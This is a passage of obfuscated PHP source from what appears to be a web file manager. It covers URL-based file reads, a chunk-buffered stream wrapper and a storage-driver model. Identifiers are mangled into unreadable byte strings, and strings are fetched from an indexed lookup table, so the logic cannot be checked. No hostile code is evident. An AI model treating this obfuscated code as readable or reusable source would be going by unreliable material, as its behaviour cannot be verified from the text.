$_SERVER[Ş­ğŠìÒ]; $Í®ºÔô± = $this->header($Ô òï); if (!$Í®ºÔô± || !$Í®ºÔô±[$à•®¾¥Ë[817]]) { return !1; } $‚¬£†û¼ = _get($Í®ºÔô±, $à•®¾¥Ë[413], 0); $Áã’È† = array($à•®¾¥Ë[32] => $Í®ºÔô±[$à•®¾¥Ë[32]], $à•®¾¥Ë[87] => $Ô òï, $à•®¾¥Ë[33] => $à•®¾¥Ë[230], $à•®¾¥Ë[79] => intval($‚¬£†û¼), $à•®¾¥Ë[169] => get_path_ext($Í®ºÔô±[$à•®¾¥Ë[32]]), $à•®¾¥Ë[1449] => $‚¬£†û¼ > 0 && $Í®ºÔô±[$à•®¾¥Ë[1599]], $à•®¾¥Ë[1450] => !1); return $Áã’È†; } private function header($ùê‚§‡¥) { $¡…İ§Ã =& $_SERVER[Ş­ğŠìÒ]; if (isset(self::$_cacheHeader[$ùê‚§‡¥])) { return self::$_cacheHeader[$ùê‚§‡¥]; } $áÔ¡¸ = isset($GLOBALS[$¡…İ§Ã[1600]]) ? $GLOBALS[$¡…İ§Ã[1600]] : !1; $GLOBALS[$¡…İ§Ã[1600]] = !0; self::$_cacheHeader[$ùê‚§‡¥] = url_header($ùê‚§‡¥); $GLOBALS[$¡…İ§Ã[1600]] = $áÔ¡¸; return self::$_cacheHeader[$ùê‚§‡¥]; } public function hashSimple($ô„ù·„ê, $¢Ô‰»± = false) { $¶‹÷ù‰ñ =& $_SERVER[Ş­ğŠìÒ]; $âá¸­ƒ = $this->info($ô„ù·„ê); if (!$âá¸­ƒ || !$âá¸­ƒ[$¶‹÷ù‰ñ[232]]) { return !1; } $Õ†‘ŞÇ¯ = $âá¸­ƒ[$¶‹÷ù‰ñ[79]]; $·©˜Ä¿ì = 200; $¿—ÙàÁù = 50; if ($Õ†‘ŞÇ¯ <= $·©˜Ä¿ì * $¿—ÙàÁù) { return md5($this->fileSubstr($ô„ù·„ê, 0, $Õ†‘ŞÇ¯)) . $Õ†‘ŞÇ¯; } $¾¼éË¯ = intval($Õ†‘ŞÇ¯ / $¿—ÙàÁù); $øÙÒÕÒ = $¶‹÷ù‰ñ[12]; $Èò¼ìÑñ = timeFloat(); $Ÿıéæ†é = 15; for ($û¼±ş‘Ü = 0; $û¼±ş‘Ü < $¿—ÙàÁù; $û¼±ş‘Ü++) { if (timeFloat() - $Èò¼ìÑñ > $Ÿıéæ†é) { return !1; } $ñîÃ¶¥æ = $this->fileSubstr($ô„ù·„ê, $¾¼éË¯ * $û¼±ş‘Ü, $·©˜Ä¿ì); if (!$ñîÃ¶¥æ) { return !1; } $øÙÒÕÒ .= $ñîÃ¶¥æ; } $øÙÒÕÒ .= $this->fileSubstr($ô„ù·„ê, $Õ†‘ŞÇ¯ - $·©˜Ä¿ì, $·©˜Ä¿ì); return md5($øÙÒÕÒ) . $Õ†‘ŞÇ¯; } public function getContent($¬µÃÌ²Ñ) { return $this->fileSubstr($¬µÃÌ²Ñ); } public function fileSubstr($¤Œ›·ÓŒ, $÷û’–¹ü = 0, $¡ÈÆ”ğü = -1) { $„ £æìŸ =& $_SERVER[Ş­ğŠìÒ]; $Œ®ßİÁƒ = $this->info($¤Œ›·ÓŒ); if (!$Œ®ßİÁƒ || !$Œ®ßİÁƒ[$„ £æìŸ[232]] && $Œ®ßİÁƒ[$„ £æìŸ[79]] > 1024 * 1024 * 10) { return !1; } if ($¡ÈÆ”ğü === -1) { $¡ÈÆ”ğü = $Œ®ßİÁƒ[$„ £æìŸ[79]]; } if ($¡ÈÆ”ğü == 0) { return $„ £æìŸ[12]; } $èøÑû“¥ = array($„ £æìŸ[1601] . $÷û’–¹ü . $„ £æìŸ[852] . ($÷û’–¹ü + $¡ÈÆ”ğü - 1)); $€ãµãöÎ = url_request($¤Œ›·ÓŒ, $„ £æìŸ[261], !1, $èøÑû“¥, !1, !1, 30); return $€ãµãöÎ[$„ £æìŸ[1283]] ? $€ãµãöÎ[$„ £æìŸ[1283]] : $„ £æìŸ[12]; } public function download($‹“Â¾ùü, $ºç‘¿Ò) { Downloader::start($‹“Â¾ùü, $ºç‘¿Ò); return $ºç‘¿Ò; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ñîø›á, $„’©’Ùç = '') { $this->info = $this->info($ñîø›á); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Ş­ğŠìÒ][87]]; $this->pathOpen = $ñîø›á; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ñîø›á])) { self::$_chunkBuffer[$ñîø›á] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($…şåô®) { $å„¸şÓ¼ = $this->fileSubstr($this->pose, $…şåô®); $this->pose += strlen($å„¸şÓ¼); return $å„¸şÓ¼; } public function stream_tell() { return $this->pose; } public function stream_seek($¸ö›¼ , $¤¨Ú®¡Ü) { $âüèşø =& $_SERVER[Ş­ğŠìÒ]; if ($¤¨Ú®¡Ü == SEEK_SET) { $this->pose = $¸ö›¼ ; } else { if ($¤¨Ú®¡Ü == SEEK_CUR) { $this->pose += $¸ö›¼ ; } else { if ($¤¨Ú®¡Ü == SEEK_END) { $this->pose = $this->info[$âüèşø[79]] + intval($¸ö›¼ ); } } } if ($¸ö›¼  < 0) { $this->pose = $this->info[$âüèşø[79]] + $¸ö›¼ ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Ş­ğŠìÒ][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($®Ë˜çË¿, $ÇßÜÆ¤) { $ñº¥ù =& $_SERVER[Ş­ğŠìÒ]; $ íøÀÑ¤ = $this->info($®Ë˜çË¿); return array($ñº¥ù[1602] => 0, $ñº¥ù[1603] => 0, $ñº¥ù[16] => 32768 + 511, $ñº¥ù[1604] => 0, $ñº¥ù[1605] => 0, $ñº¥ù[1606] => 0, $ñº¥ù[1607] => 0, $ñº¥ù[79] => $ íøÀÑ¤[$ñº¥ù[79]], $ñº¥ù[1608] => $ íøÀÑ¤[$ñº¥ù[1448]], $ñº¥ù[1564] => $ íøÀÑ¤[$ñº¥ù[88]], $ñº¥ù[1563] => $ íøÀÑ¤[$ñº¥ù[231]], $ñº¥ù[1609] => 0, $ñº¥ù[1610] => 0); } static $fileInfo = array(); public function info($Ô¨¥¢É) { $·³Ñ¹»² = $_SERVER[Ş­ğŠìÒ][1611]; if (isset(self::$fileInfo[$Ô¨¥¢É])) { return self::$fileInfo[$Ô¨¥¢É]; } if (substr($Ô¨¥¢É, 0, strlen($·³Ñ¹»²)) != $·³Ñ¹»²) { return !1; } self::$fileInfo[$Ô¨¥¢É] = IO::info(substr($Ô¨¥¢É, strlen($·³Ñ¹»²))); return self::$fileInfo[$Ô¨¥¢É]; } public static function read($£Óõ¹ïœ, $¥ááã«˜, $¶”‚µ) { if (!isset(self::$_fopenCache[$£Óõ¹ïœ])) { $¥ÊëÈÈ = new StreamWrapperIO(); $¥ÊëÈÈ->stream_open($£Óõ¹ïœ); self::$_fopenCache[$£Óõ¹ïœ] = $¥ÊëÈÈ; } $¥ÊëÈÈ = self::$_fopenCache[$£Óõ¹ïœ]; return $¥ÊëÈÈ->fileSubstr($¥ááã«˜, $¶”‚µ); } public static function _read($™¤ùÈ¶×, $¨ßî”«‚, $Ëá‹“ğ«) { $â¨¬Òø =& $_SERVER[Ş­ğŠìÒ]; $ğÀÓ‹Á³ = fopen($™¤ùÈ¶×, $â¨¬Òø[1452]); if (!$ğÀÓ‹Á³) { return $â¨¬Òø[12]; } $ñø±ñéâ = 8192; fseek($ğÀÓ‹Á³, $¨ßî”«‚, SEEK_SET); $ş“ö¸¾˜ = $â¨¬Òø[12]; $™ˆÜ‚È‹ = 0; while ($™ˆÜ‚È‹ < $Ëá‹“ğ«) { $áÕ“õš› = min($ñø±ñéâ, $Ëá‹“ğ« - $™ˆÜ‚È‹); $ş“ö¸¾˜ .= fread($ğÀÓ‹Á³, $áÕ“õš›); $™ˆÜ‚È‹ += $áÕ“õš›; } fclose($ğÀÓ‹Á³); return $ş“ö¸¾˜; } public function fileSubstr($êÙ‚ÏÜŒ, $‹ºÇÕİì) { $É‘ÃÏ–Õ =& $_SERVER[Ş­ğŠìÒ]; $¿Ïƒ¨¤’ = $this->info[$É‘ÃÏ–Õ[79]]; $ª¼ª›Ë¤ = $êÙ‚ÏÜŒ; $§†åï¡ò = $‹ºÇÕİì; if ($êÙ‚ÏÜŒ < 0) { $êÙ‚ÏÜŒ = $¿Ïƒ¨¤’ + $êÙ‚ÏÜŒ; } if ($‹ºÇÕİì === !1) { $‹ºÇÕİì = $¿Ïƒ¨¤’ - $êÙ‚ÏÜŒ; } if ($êÙ‚ÏÜŒ + $‹ºÇÕİì > $¿Ïƒ¨¤’) { $‹ºÇÕİì = $¿Ïƒ¨¤’ - $êÙ‚ÏÜŒ; } if ($‹ºÇÕİì <= 0) { return $É‘ÃÏ–Õ[12]; } if ($êÙ‚ÏÜŒ < 0 || $êÙ‚ÏÜŒ >= $¿Ïƒ¨¤’ || $‹ºÇÕİì <= 0 || $‹ºÇÕİì > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\x46\151\x6c\x65\122\x65\x61\x64\x20\145\x72\162\x6f\162\x21\x20\x73\164\x61\162\164\75{$êÙ‚ÏÜŒ}\x3b\x6c\x65\x6e\147\164\150\75{$‹ºÇÕİì}\x3b\x20\x73\151\172\x65\75{$¿Ïƒ¨¤’}\73"); } $£«ƒ™ûÁ = 64 * 1024; $Âã¬šÔõ =& self::$_chunkBuffer[$this->path]; if (!$Âã¬šÔõ) { $Âã¬šÔõ = array(); } $íÛÎó³Ö = 0; $³¡õø…• = 0; $àş¤Â‘Í = $É‘ÃÏ–Õ[12]; foreach ($Âã¬šÔõ as $íÛÎó³Ö => $àş¤Â‘Í) { $íÛÎó³Ö = intval($íÛÎó³Ö); $³¡õø…• = $íÛÎó³Ö + strlen($àş¤Â‘Í); if ($êÙ‚ÏÜŒ >= $³¡õø…•) { continue; } if ($êÙ‚ÏÜŒ >= $íÛÎó³Ö && $êÙ‚ÏÜŒ + $‹ºÇÕİì <= $³¡õø…•) { return substr($àş¤Â‘Í, $êÙ‚ÏÜŒ - $íÛÎó³Ö, $‹ºÇÕİì); } break; } if (count($Âã¬šÔõ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($É‘ÃÏ–Õ[1612], $É‘ÃÏ–Õ[1613] . count($Âã¬šÔõ) . "\x3b\163\x74\141\162\164\x3d{$êÙ‚ÏÜŒ}\x2c\154\x65\156\x67\x74\x68\75{$‹ºÇÕİì}\73\160\x6f\163\145\72{$íÛÎó³Ö}\x7e{$³¡õø…•}"); throw new Exception($É‘ÃÏ–Õ[1614]); } $×é¦ÒÇ• = intval($êÙ‚ÏÜŒ / $£«ƒ™ûÁ) * $£«ƒ™ûÁ; $ú¯øŞØ = ceil(($êÙ‚ÏÜŒ + $‹ºÇÕİì) / $£«ƒ™ûÁ) * $£«ƒ™ûÁ - $×é¦ÒÇ•; $€¹°Áª­ = IO::fileSubstr($this->path, $×é¦ÒÇ•, $ú¯øŞØ); $Âã¬šÔõ[$×é¦ÒÇ• . $É‘ÃÏ–Õ[12]] = $€¹°Áª­; ksort($Âã¬šÔõ); $¬ÙÜƒ³½ = substr($€¹°Áª­, $êÙ‚ÏÜŒ - $×é¦ÒÇ•, $‹ºÇÕİì); return $¬ÙÜƒ³½; } private function log($èóú¸ğâ, $–”Ùß”) { $ŞÀµéªŠ =& $_SERVER[Ş­ğŠìÒ]; $ñ¼Òòá— = timeFloat() - $this->timeStart; write_log(sprintf($ŞÀµéªŠ[1615], $èóú¸ğâ, $this->info[$ŞÀµéªŠ[32]], $ñ¼Òòá—, $–”Ùß”), $ŞÀµéªŠ[1260]); } } goto AíòˆÃ…á†; D½Àï«Ûã²: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\163\164\x6f\x72\x61\x67\145\114\151\x73\164"; public $field = array("\156\x61\155\x65", "\x73\x69\x7a\145\x4d\141\x78", "\163\x79\x73\x74\145\155", "\x64\145\146\141\165\x6c\x74", "\x64\162\151\166\x65\x72", "\x63\x6f\156\146\x69\x67"); public function listData($ÄÁ£¨è = false, $¤¨é¿ëş = "\x6d\157\144\x69\x66\171\x54\x69\155\145", $¦Üšıæ˜ = false) { $Ô‘ñ¾‡ì =& $_SERVER[Ş­ğŠìÒ]; $ÆÁÜå¢œ = parent::listData($ÄÁ£¨è, $¤¨é¿ëş, $¦Üšıæ˜); if ($ÄÁ£¨è) { return $ÆÁÜå¢œ; } $Äïó—­ = array(); if ($GLOBALS[$Ô‘ñ¾‡ì[2291]]) { $Äïó—­ = $this->ioSizeUseGet(array_to_keyvalue($ÆÁÜå¢œ, $Ô‘ñ¾‡ì[12], $Ô‘ñ¾‡ì[475])); } foreach ($ÆÁÜå¢œ as $Í’úÄ†ú => $•Ô“‡‹¥) { unset($ÆÁÜå¢œ[$Í’úÄ†ú][$Ô‘ñ¾‡ì[6]]); $ÆÁÜå¢œ[$Í’úÄ†ú][$Ô‘ñ¾‡ì[1951]] = isset($Äïó—­[$•Ô“‡‹¥[$Ô‘ñ¾‡ì[475]]]) ? $Äïó—­[$•Ô“‡‹¥[$Ô‘ñ¾‡ì[475]]] : 0; } return $ÆÁÜå¢œ; } public function ioSizeUseGet($óÊœ’Ô) { $»¤ì…¼› =& $_SERVER[Ş­ğŠìÒ]; if (!$óÊœ’Ô) { return array(); } $¼¦†»®› = $»¤ì…¼›[2292] . implode($»¤ì…¼›[50], $óÊœ’Ô); $ÏÛÉŞ¨è = Cache::get($¼¦†»®›); if ($ÏÛÉŞ¨è) { return $ÏÛÉŞ¨è; } $Ìˆ®ç‚ú = array($»¤ì…¼›[884] => $»¤ì…¼›[475], $»¤ì…¼›[2293] => $»¤ì…¼›[79]); $ÃØ§ú = array($»¤ì…¼›[884] => array($»¤ì…¼›[7], $óÊœ’Ô)); $ÏÛÉŞ¨è = Model($»¤ì…¼›[856])->field($Ìˆ®ç‚ú)->where($ÃØ§ú)->group($»¤ì…¼›[884])->select(); $ÏÛÉŞ¨è = array_to_keyvalue($ÏÛÉŞ¨è, $»¤ì…¼›[475], $»¤ì…¼›[79]); Cache::set($¼¦†»®›, $ÏÛÉŞ¨è, 600); return $ÏÛÉŞ¨è; } public function getConfig($Ğ¬¼ŸŞ) { $ÜëÖ˜©‘ = parent::listData($Ğ¬¼ŸŞ); return json_decode($ÜëÖ˜©‘[$_SERVER[Ş­ğŠìÒ][6]], !0); } public function update($ŒÛ‡ñÊ×, $ÔÎâ¾öü) { $Ì¿ÇÁÁ» =& $_SERVER[Ş­ğŠìÒ]; $…—Â·İ¯ = $ÔÎâ¾öü[$Ì¿ÇÁÁ»[32]]; $Êï´£ = array_to_keyvalue(parent::listData(), $Ì¿ÇÁÁ»[32]); if (isset($Êï´£[$…—Â·İ¯]) && $Êï´£[$…—Â·İ¯][$Ì¿ÇÁÁ»[475]] != $ŒÛ‡ñÊ×) { return !1; } $this->checkPwd($ŒÛ‡ñÊ×, $ÔÎâ¾öü); if (isset($ÔÎâ¾öü[$Ì¿ÇÁÁ»[2294]]) && $ÔÎâ¾öü[$Ì¿ÇÁÁ»[2294]] == $Ì¿ÇÁÁ»[91]) { $this->checkConfig($ÔÎâ¾öü); } unset($ÔÎâ¾öü[$Ì¿ÇÁÁ»[2294]]); $âÊóÁôñ = parent::update($ŒÛ‡ñÊ×, $ÔÎâ¾öü); if ($âÊóÁôñ && $ÔÎâ¾öü[$Ì¿ÇÁÁ»[37]]) { $üÎŠù‚¨ = 0; foreach ($Êï´£ as $ÙÔÖœÄ) { if ($ÙÔÖœÄ[$Ì¿ÇÁÁ»[37]] && $ÙÔÖœÄ[$Ì¿ÇÁÁ»[475]] != $ŒÛ‡ñÊ×) { $üÎŠù‚¨ = $ÙÔÖœÄ[$Ì¿ÇÁÁ»[475]]; parent::update($ÙÔÖœÄ[$Ì¿ÇÁÁ»[475]], array($Ì¿ÇÁÁ»[37] => 0)); } } $this->updateBackup($ŒÛ‡ñÊ×, $üÎŠù‚¨); } return $âÊóÁôñ; } public function add($¯Ğ„Úî°) { $˜¬Êá¦ò =& $_SERVER[Ş­ğŠìÒ]; $Æõ“ºØ¨ = array_to_keyvalue(parent::listData(), $˜¬Êá¦ò[32]); if (isset($Æõ“ºØ¨[$¯Ğ„Úî°[$˜¬Êá¦ò[32]]])) { return !1; } $this->checkConfig($¯Ğ„Úî°); $Ò÷Á˜¦± = parent::insert($¯Ğ„Úî°); if ($Ò÷Á˜¦± && $¯Ğ„Úî°[$˜¬Êá¦ò[37]]) { foreach ($Æõ“ºØ¨ as $”ûèÀıç) { if ($”ûèÀıç[$˜¬Êá¦ò[37]]) { parent::update($”ûèÀıç[$˜¬Êá¦ò[475]], array($˜¬Êá¦ò[37] => 0)); } } } return $Ò÷Á˜¦±; } public function updateBackup($œŒ‘Í™, $™¹ƒ°Šã) { $Â°¡’ËÖ =& $_SERVER[Ş­ğŠìÒ]; if (!$™¹ƒ°Šã) { return; } $âù¿©È = Model($Â°¡’ËÖ[815])->config(); if ($âù¿©È[$Â°¡’ËÖ[1734]] != $Â°¡’ËÖ[91] || $âù¿©È[$Â°¡’ËÖ[819]] != $™¹ƒ°Šã) { return; } $œéâ¯¨ = Model($Â°¡’ËÖ[837])->get($Â°¡’ËÖ[850]); $œéâ¯¨ = json_decode($œéâ¯¨, !0); if (!$œéâ¯¨) { return; } $œéâ¯¨[$Â°¡’ËÖ[819]] = $œŒ‘Í™; Model($Â°¡’ËÖ[837])->set(array($Â°¡’ËÖ[850] => $œéâ¯¨)); } public function checkPwd($³ËÚŒè, &$Â¯ãæğ) { $¬•õéò£ =& $_SERVER[Ş­ğŠìÒ]; if (empty($Â¯ãæğ[$¬•õéò£[6]])) { return; } $¦½¬¬ëÔ = json_decode($Â¯ãæğ[$¬•õéò£[6]], !0); $ïë§ƒÄ¾ = $¬•õéò£[12]; $”Şª˜ØÏ = array($¬•õéò£[2295], $¬•õéò£[2296], $¬•õéò£[963]); foreach ($”Şª˜ØÏ as $¢ê­éÅ¸) { if (isset($¦½¬¬ëÔ[$¢ê­éÅ¸])) { $ïë§ƒÄ¾ = $¢ê­éÅ¸; break; } } if (!$ïë§ƒÄ¾) { return; } $ğ¼™–ã = $this->getConfig($³ËÚŒè); $û¥Œ²öÈ = $ğ¼™–ã[$ïë§ƒÄ¾]; $øß­¿¸œ = $¦½¬¬ëÔ[$ïë§ƒÄ¾]; if ($øß­¿¸œ == str_repeat($¬•õéò£[220], strlen($û¥Œ²öÈ))) { $¦½¬¬ëÔ[$ïë§ƒÄ¾] = $û¥Œ²öÈ; $Â¯ãæğ[$¬•õéò£[6]] = json_encode($¦½¬¬ëÔ); } else { if ($øß­¿¸œ != $û¥Œ²öÈ) { $Â¯ãæğ[$¬•õéò£[2294]] = $¬•õéò£[91]; } } } public function checkConfig(&$àïŒ˜á, $¹ÍïÂá = false) { $ûí¹§»ë =& $_SERVER[Ş­ğŠìÒ]; $¦äÄûÇ = strtolower($àïŒ˜á[$ûí¹§»ë[98]]); $‹¥º·ô = json_decode($àïŒ˜á[$ûí¹§»ë[6]], !0); foreach ($‹¥º·ô as $‰ÊÖÒ => $ªÅêù«) { if (is_string($ªÅêù«)) { $‹¥º·ô[$‰ÊÖÒ] = trim($ªÅêù«); } } $‹¥º·ô[$ûí¹§»ë[2297]] = rand_string(6); $½Ä—¦±‰ = $GLOBALS[$ûí¹§»ë[6]][$ûí¹§»ë[92]][$ûí¹§»ë[892]]; $ôèåšùÁ = isset($½Ä—¦±‰[$¦äÄûÇ]) ? $½Ä—¦±‰[$¦äÄûÇ] : ucfirst($¦äÄûÇ); $ÑæíÉÖ• = $ûí¹§»ë[77] . $ôèåšùÁ; if (!$ôèåšùÁ || !class_exists($ÑæíÉÖ•)) { if ($¹ÍïÂá) { return LNG($ûí¹§»ë[2298]); } write_log(array($ûí¹§»ë[2299], $àïŒ˜á, get_caller_info()), $ûí¹§»ë[215]); show_json(LNG($ûí¹§»ë[2298]), !1, $àïŒ˜á); } $èêˆ¤Óì = new $ÑæíÉÖ•($‹¥º·ô); if (in_array($¦äÄûÇ, $èêˆ¤Óì->objectDriver)) { try { if (!$èêˆ¤Óì->isBucketCors() && !$èêˆ¤Óì->setBucketCors()) { $‰šÒßıì = LNG($ûí¹§»ë[2300]); $‰šÒßıì .= $ûí¹§»ë[2301] . LNG($ûí¹§»ë[2302]); } } catch (Exception $©¿¦ËÛ) { $‰šÒßıì = $©¿¦ËÛ->getMessage(); } if (isset($‰šÒßıì)) { return $this->_parseError($‰šÒßıì, $¦äÄûÇ, $¹ÍïÂá); } if ($¦äÄûÇ == $ûí¹§»ë[68] && !$èêˆ¤Óì->checkRegion()) { return $this->_parseError(LNG($ûí¹§»ë[2303]), $¦äÄûÇ, $¹ÍïÂá); } } $éÅëÏşÜ = rtrim($‹¥º·ô[$ûí¹§»ë[1258]], $ûí¹§»ë[8]) . $ûí¹§»ë[8]; $É˜İØ¿ = $èêˆ¤Óì->getPath($éÅëÏşÜ . $ûí¹§»ë[1262]); try { if ($¦äÄûÇ == $ûí¹§»ë[109]) { $èêˆ¤Óì->mkdir($éÅëÏşÜ); } $İ‘î’­¶ = $èêˆ¤Óì->mkfile($É˜İØ¿); if (!$İ‘î’­¶) { $‰šÒßıì = LNG($ûí¹§»ë[2300]); } } catch (Exception $©¿¦ËÛ) { $‰šÒßıì = $©¿¦ËÛ->getMessage(); } if (isset($‰šÒßıì)) { return $this->_parseError($‰šÒßıì, $¦äÄûÇ, $¹ÍïÂá); } $‹¥º·ô[$ûí¹§»ë[1258]] = $éÅëÏşÜ; $àïŒ˜á[$ûí¹§»ë[6]] = json_encode($‹¥º·ô); $àïŒ˜á[$ûí¹§»ë[98]] = $ôèåšùÁ; return !0; } private function _parseError($²ô Å€”, $øô˜üœ, $½Şïû¶‚ = false) { $ø¹Õ‡Ôƒ =& $_SERVER[Ş­ğŠìÒ]; if ($øô˜üœ == $ø¹Õ‡Ôƒ[68] && stripos($²ô Å€”, $ø¹Õ‡Ôƒ[2304])) { $²³®ì¥® = explode($ø¹Õ‡Ôƒ[10], $²ô Å€”); $íáäîŠÓ = isset($²³®ì¥®[1]) ? $²³®ì¥®[1] : $ø¹Õ‡Ôƒ[12]; $ÏĞ˜‹’à = array($ø¹Õ‡Ôƒ[2305] => LNG($ø¹Õ‡Ôƒ[2306]), $ø¹Õ‡Ôƒ[2307] => LNG($ø¹Õ‡Ôƒ[2308])); if (isset($ÏĞ˜‹’à[$íáäîŠÓ])) { $²ô Å€” = $ÏĞ˜‹’à[$íáäîŠÓ]; } } if (stripos($²ô Å€”, $ø¹Õ‡Ôƒ[2309]) === 0) { $½†³ù½Ş = strpos($²ô Å€”, $ø¹Õ‡Ôƒ[178]); if ($½†³ù½Ş === !1) { $½†³ù½Ş = strpos($²ô Å€”, $ø¹Õ‡Ôƒ[4]); } if ($½†³ù½Ş !== !1) { $²ô Å€” = substr($²ô Å€”, $½†³ù½Ş + 1); } } $²ô Å€” = LNG($ø¹Õ‡Ôƒ[1265]) . $²ô Å€”; if ($½Şïû¶‚) { return $²ô Å€”; } show_json($²ô Å€”, !1); } public function driverListSystem() { $õäÆÆ“… =& $_SERVER[Ş­ğŠìÒ]; $şãõ¸šå = parent::listData(); $ğŞè·õ = array(); foreach ($şãõ¸šå as $ÎêÃ½½±) { unset($ÎêÃ½½±[$õäÆÆ“…[231]], $ÎêÃ½½±[$õäÆÆ“…[88]]); $ÎêÃ½½±[$õäÆÆ“…[6]] = json_decode($ÎêÃ½½±[$õäÆÆ“…[6]], !0); $ğŞè·õ[] = $ÎêÃ½½±; } return $ğŞè·õ; } public function defaultDriver() { $×‘Õ×ø­ =& $_SERVER[Ş­ğŠìÒ]; $ç“¾åõ¬ = parent::listData(); $ŒÕ¢çŒÀ = array_filter_by_field($ç“¾åõ¬, $×‘Õ×ø­[37], 1); $ŒÕ¢çŒÀ = $ŒÕ¢çŒÀ[0]; if ($ŒÕ¢çŒÀ) { $ŒÕ¢çŒÀ[$×‘Õ×ø­[6]] = json_decode($ŒÕ¢çŒÀ[$×‘Õ×ø­[6]], !0); } return $ŒÕ¢çŒÀ; } public function driverInfo($æÌı¿ø¥) { $¶´Á²ãî =& $_SERVER[Ş­ğŠìÒ]; $áÙ’ç¤ù = array_to_keyvalue(parent::listData(), $¶´Á²ãî[475]); if (!isset($áÙ’ç¤ù[$æÌı¿ø¥])) { return !1; } $ÌçŒŠÀ« = $áÙ’ç¤ù[$æÌı¿ø¥]; $ÌçŒŠÀ«[$¶´Á²ãî[6]] = json_decode($ÌçŒŠÀ«[$¶´Á²ãî[6]], !0); return $ÌçŒŠÀ«; } public function remove($¢©Üµ› ) { $this->removeShareItems($¢©Üµ› ); return parent::remove($¢©Üµ› ); } public function removeWithFile($úÙ°Åı, $ŠëŠìË², $îÓ©­Š, $ùÓ¢Ò±® = false) { $ŠÏ¢ ëï =& $_SERVER[Ş­ğŠìÒ]; $¦‰Ò‹ˆ = array($ŠÏ¢ ëï[884] => $úÙ°Åı); $‡ÓãÌ¦¥ = Model($ŠÏ¢ ëï[544])->where($¦‰Ò‹ˆ)->count(); $ø¨©å™ = Model($ŠÏ¢ ëï[544])->where($¦‰Ò‹ˆ)->sum($ŠÏ¢ ëï[79]); $Û¼•¥½õ = $ŠëŠìË² . $ŠÏ¢ ëï[2310] . $úÙ°Åı; $ÑÕÇí£Ï = LNG($ŠëŠìË² == $ŠÏ¢ ëï[620] ? $ŠÏ¢ ëï[2311] : $ŠÏ¢ ëï[2312]); $úøé±öç = new TaskFileTransfer($Û¼•¥½õ, $ŠÏ¢ ëï[215], $‡ÓãÌ¦¥, $ÑÕÇí£Ï . $ŠÏ¢ ëï[462] . $îÓ©­Š[$ŠÏ¢ ëï[32]] . $ŠÏ¢ ëï[214] . $úÙ°Åı); $úøé±öç->task[$ŠÏ¢ ëï[830]] = (double) $ø¨©å™; $ù÷°ü¨É = KodIO::defaultDriver(); $¡®º¢‡ = $ù÷°ü¨É[$ŠÏ¢ ëï[475]]; $ÚßüØ¼¿ = $Ã×Âú· = $Â—¶Å²ö = array(); $ ø¨ªà = Model($ŠÏ¢ ëï[230])->where($¦‰Ò‹ˆ)->field($ŠÏ¢ ëï[2313])->select(); foreach ($ ø¨ªà as $“ÎšÆÆˆ) { $ñÉış˜í = $“ÎšÆÆˆ[$ŠÏ¢ ëï[541]]; if ($ùÓ¢Ò±®) { $Ã×Âú·[] = $ñÉış˜í; continue; } $áŠŒğ¾“ = $“ÎšÆÆˆ[$ŠÏ¢ ëï[87]]; $¹„·‰£È = get_path_father($áŠŒğ¾“); $Â—¶Å²ö[] = $¹„·‰£È; $¹„·‰£È = str_replace("\173\x69\x6f\x3a{$úÙ°Åı}\175\57", "\x7b\151\157\x3a{$¡®º¢‡}\x7d\57", $¹„·‰£È); if (!IO::exist($áŠŒğ¾“)) { $ÚßüØ¼¿[] = $ñÉış˜í; $úøé±öç->updateFileEnd($“ÎšÆÆˆ[$ŠÏ¢ ëï[32]], $“ÎšÆÆˆ[$ŠÏ¢ ëï[79]]); write_log($ŠÏ¢ ëï[2314] . $áŠŒğ¾“, $ŠÏ¢ ëï[1894]); continue; } $êĞéÙ = IO::move($áŠŒğ¾“, $¹„·‰£È, REPEAT_RENAME); if (!$êĞéÙ) { $Ã×Âú·[] = $ñÉış˜í; $úøé±öç->updateFileEnd($“ÎšÆÆˆ[$ŠÏ¢ ëï[32]], $“ÎšÆÆˆ[$ŠÏ¢ ëï[79]]); write_log($ŠÏ¢ ëï[2315] . $áŠŒğ¾“, $ŠÏ¢ ëï[1894]); continue; } $¦‰Ò‹ˆ = array($ŠÏ¢ ëï[541] => $ñÉış˜í); $¾—ñÑÆ‡ = array($ŠÏ¢ ëï[884] => $¡®º¢‡, $ŠÏ¢ ëï[87] => $êĞéÙ); Model($ŠÏ¢ ëï[230])->where($¦‰Ò‹ˆ)->save($¾—ñÑÆ‡); } $Â³Æˆ´æ = $úøé±öç->task; if (!$ùÓ¢Ò±®) { Cache::set($Û¼•¥½õ, $Â³Æˆ´æ); } $úøé±öç->end(); $ÚßüØ¼¿ = array_unique($ÚßüØ¼¿); $Ã×Âú· = array_unique($Ã×Âú·); if (!$ùÓ¢Ò±® && ($ÚßüØ¼¿ || $Ã×Âú·)) { $ÆÙş¾ÜØ = array(); if ($ÚßüØ¼¿) { $ÆÙş¾ÜØ[] = sprintf(LNG($ŠÏ¢ ëï[2316]), count($ÚßüØ¼¿)); } if ($Ã×Âú·) { $ÆÙş¾ÜØ[] = sprintf(LNG($ŠÏ¢ ëï[2317]), count($Ã×Âú·)); } $ÆÙş¾ÜØ = sprintf(LNG($ŠÏ¢ ëï[2318]), implode($ŠÏ¢ ëï[2319], $ÆÙş¾ÜØ)) . $ŠÏ¢ ëï[2320] . date($ŠÏ¢ ëï[2321]) . $ŠÏ¢ ëï[2322]; if ($ŠëŠìË² == $ŠÏ¢ ëï[1931]) { $ÆÙş¾ÜØ .= $ŠÏ¢ ëï[2323] . LNG($ŠÏ¢ ëï[2324]); } $Â³Æˆ´æ[$ŠÏ¢ ëï[1260]] = $ÆÙş¾ÜØ; Cache::set($Û¼•¥½õ, $Â³Æˆ´æ); unset($îÓ©­Š[$ŠÏ¢ ëï[6]]); $°˜Û°‡¨ = array($ŠÏ¢ ëï[475] => $úÙ°Åı, 